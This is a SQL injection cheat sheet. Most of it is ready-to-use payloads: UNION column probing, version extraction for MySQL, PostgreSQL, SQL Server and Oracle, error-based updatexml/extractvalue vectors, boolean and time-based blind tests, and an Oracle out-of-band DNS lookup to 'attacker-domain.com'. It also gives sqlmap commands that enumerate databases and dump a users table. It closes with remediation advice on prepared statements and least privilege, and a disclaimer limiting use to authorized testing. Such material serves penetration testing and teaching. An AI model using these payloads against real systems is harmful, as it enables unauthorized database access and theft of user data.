# SQL Injection (SQLi) Technical Reference Guide

## 📌 Description
SQL Injection (SQLi) is a critical web vulnerability that allows an attacker to interfere with the queries an application makes to its database. This allows attackers to view, modify, or delete sensitive data, and in some cases, achieve Remote Code Execution (RCE).

---

## 🔍 SQLi Detection Methodology

To find SQLi, look for input fields, URL parameters, headers, or cookies that interact with a database back-end.

### 1. Triggering an Error
Inject special characters into parameters to break the database query syntax:


  '
  "
  `
  ')
  ")
  ;

### 2. Boolean Tests
Inject logical operators to verify if the application responds differently:

 ' OR 1=1 -- -
 ' OR 1=2 -- -

### 3. Mathematical Evaluation
Inject expressions to test if parameters are evaluated numerically:

  1.Target /item.php?id=5 with /item.php?id=6-1

  2.If the application returns the same result for both, numerical input is being evaluated.

## ⚡ SQLi Categories & Practical Payloads

### 1. In-Band (Classic) SQLi
Data is extracted using the same channel used to launch the attack.

# A. UNION-Based SQLi
Used when query results are returned directly in the application's response.

# 1.Determine Column Count: Increment until an error or change in response occurs:

  ' ORDER BY 1 -- -
  ' ORDER BY 2 -- -
  ' ORDER BY 3 -- -

# 2.Determine Column Data Types: Look for which columns can hold string data:

  ' UNION SELECT 'a', NULL -- -
  ' UNION SELECT NULL, 'a' -- -

# 3.Retrieve Data (Targeting Database Version):

  1.MySQL/MariaDB: ' UNION SELECT @@version, NULL -- -

  2.PostgreSQL: ' UNION SELECT version(), NULL -- -

  3.Microsoft SQL Server: ' UNION SELECT @@version, NULL -- -

  4.Oracle: ' UNION SELECT banner, NULL FROM v$version -- -

# B. Error-Based SQLi
Used when the response contains raw database error messages, forcing the database to leak sensitive data inside the error details.

1.UpdateXML Vector (MySQL):

  ' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) -- -

2.ExtractValue Vector (MySQL):

  ' AND extractvalue(1,concat(0x7e,database())) -- -

### 2. Inferential (Blind) SQLi
No data is transferred directly in the response. Attackers reconstruct the data by asking the database "True" or "False" questions.

# A. Boolean-Based Blind
The application response changes structure depending on whether the query evaluates to True or False.

1.Payload Example (MySQL): Test if the first character of the database name is "a":

  ' AND SUBSTRING(database(),1,1)='a' -- -

# B. Time-Based Blind
The attacker forces the database to pause (sleep) before responding to verify if a condition is True.

1.MySQL Payload:

  ' AND IF(1=1, SLEEP(5), 0) -- -

2.PostgreSQL Payload:

  ' AND (SELECT 1 FROM PG_SLEEP(5)) -- -

3.Microsoft SQL Server Payload:

  ' IF(1=1) WAITFOR DELAY '0:0:5' -- -

###3. Out-of-Band (OAST) SQLi
Forces the database to initiate an out-of-bound network request (DNS or HTTP) to a server under your control.

1.DNS Lookup Vector (Oracle):

  ' UNION SELECT UTL_INADDR.get_host_address('attacker-domain.com') FROM dual -- -

## 🛠️ Automated Testing (SQLMap)

1.Basic GET scan:

  sqlmap -u "[http://target.com/page.php?id=1](http://target.com/page.php?id=1)" --batch

2.Scan with Burp request file (recommended):

  sqlmap -r request.txt -p id --batch

3.Database enumeration:

A.Get database names

  sqlmap -r request.txt -p id --dbs

B.List tables

  sqlmap -r request.txt -p id -D target_db --tables

C.Dump table data

  sqlmap -r request.txt -p id -D target_db -T users --dump

4.Advanced flags:

  sqlmap -r request.txt --level=3 --risk=2 --threads=5

## 🛡️ Remediation & Prevention

# 1. Primary Prevention (Prepared Statements)
Ensures the database treats user input strictly as data, never as executable SQL code.

1.Insecure PHP Implementation:

  $query = "SELECT * FROM users WHERE username = '" . $user . "'";

2.Secure PHP Implementation (PDO Prepared Statement):

  $stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username');
  $stmt->execute(['username' => $user]);

# 2. Input Validation & Sanitization
Use strict allow-lists for expected data types (e.g., ensuring an ID is strictly an integer).

# 3. Principle of Least Privilege
Ensure the database user account used by the web application only has the permissions required to run (e.g., no administrative or file-system read/write permissions).

⚠️ Legal Disclaimer
All techniques documented here are for authorized testing and educational purposes only. Never test against systems without explicit written permission.






